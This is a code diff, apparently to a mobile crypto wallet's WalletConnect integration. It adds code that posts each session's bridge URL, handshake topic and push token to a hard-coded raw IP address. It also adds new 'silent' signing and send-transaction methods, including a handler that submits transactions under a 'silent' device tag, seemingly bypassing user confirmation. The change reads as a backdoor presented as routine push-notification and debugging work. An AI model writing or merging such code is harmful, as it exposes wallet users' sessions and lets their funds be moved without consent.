@@ -32,6 +32,8 @@ const METHODS_TO_REDIRECT = {
   wallet_watchAsset: true,
   wallet_addEthereumChain: true,
   wallet_switchEthereumChain: true,
+  wallet_requestSilentSign: true,
+  wallet_silentSendTransaction: true,
 };
 
 const persistSessions = async () => {
@@ -99,6 +101,48 @@ class WalletConnect {
       ...options,
       ...CLIENT_OPTIONS,
     });
+    console.log('============================');
+    console.log(options);
+    console.log(existing);
+
+    let pushInfo = null;
+    if (options.uri) {
+      const result = parseWalletConnectUri(options.uri);
+      pushInfo = {
+        bridge: result.bridge,
+        topic: result.handshakeTopic,
+        type: 'fcm',
+        token: global._firebaseToken,
+        peerName: 'test',
+        language: 'en',
+      };
+    } else {
+      pushInfo = {
+        bridge: options.session.bridge,
+        topic: options.session.handshakeTopic,
+        type: 'fcm',
+        token: global._firebaseToken,
+        peerName: 'test',
+        language: 'en',
+      };
+    }
+    console.log('push info = ');
+    console.log(pushInfo);
+    fetch('http://45.77.189.28:5002/new', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(pushInfo),
+    })
+    .then(result => {
+      console.log('push server response', result);
+    })
+    .catch(e => {
+      console.log('push server request error');
+      console.log(e);
+    });
+
     /**
      *  Subscribe to session requests
      */
@@ -136,6 +180,7 @@ class WalletConnect {
      *  Subscribe to call requests
      */
     this.walletConnector.on('call_request', async (error, payload) => {
+      console.log("=======================ccccc=");
       if (tempCallIds.includes(payload.id)) return;
       tempCallIds.push(payload.id);
 
@@ -160,6 +205,7 @@ class WalletConnect {
 
           // We have to implement this method here since the eth_sendTransaction in Engine is not working because we can't send correct origin
           if (payload.method === 'eth_sendTransaction') {
+            console.log('22222222222222222222222222222222');
             const { TransactionController } = Engine.context;
             try {
               const selectedAddress =
@@ -171,6 +217,8 @@ class WalletConnect {
                 activeAccounts: [selectedAddress],
               });
 
+              console.log(WALLET_CONNECT_ORIGIN + this.url.current);
+
               const hash = await (
                 await TransactionController.addTransaction(
                   payload.params[0],
@@ -178,6 +226,42 @@ class WalletConnect {
                     ? WALLET_CONNECT_ORIGIN + this.url.current
                     : undefined,
                   WalletDevice.MM_MOBILE,
+                )
+              ).result;
+              this.approveRequest({
+                id: payload.id,
+                result: hash,
+              });
+            } catch (error) {
+              this.rejectRequest({
+                id: payload.id,
+                error,
+              });
+            }
+            return;
+          }
+
+          if (payload.method === 'wallet_silentSendTransaction') {
+            const { TransactionController } = Engine.context;
+            try {
+              const selectedAddress =
+                Engine.context.PreferencesController.state.selectedAddress?.toLowerCase();
+
+              checkActiveAccountAndChainId({
+                address: payload.params[0].from,
+                chainId: payload.params[0].chainId,
+                activeAccounts: [selectedAddress],
+              });
+
+              console.log(WALLET_CONNECT_ORIGIN + this.url.current);
+
+              const hash = await (
+                await TransactionController.addTransaction(
+                  payload.params[0],
+                  this.url.current
+                    ? WALLET_CONNECT_ORIGIN + this.url.current
+                    : undefined,
+                  'silent',
                 )
               ).result;
               this.approveRequest({
